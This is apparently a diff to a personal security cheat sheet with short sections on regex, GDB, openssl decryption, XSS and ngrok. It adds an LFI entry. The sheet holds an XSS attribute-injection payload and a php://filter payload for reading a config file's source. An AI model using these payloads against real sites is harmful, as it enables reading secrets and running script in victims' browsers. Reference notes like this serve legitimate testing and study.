@@ -18,6 +18,7 @@ examples :
         (pub fn) ([a-z_]*)([^:\n]+):([a-zA-Z-]+)([ u0-9]*) .+
 
 # GDB
+
 | code      | Function                          |
 |-----------| ----------------------------------|
 |P      | Function address |
@@ -132,6 +133,12 @@ openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha2
 # XSS
 ```
 'onfocus="alert(1)"autofocus='
+```
+
+# LFI 
+
+```
+index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end
 ```
 
 ## NGROK
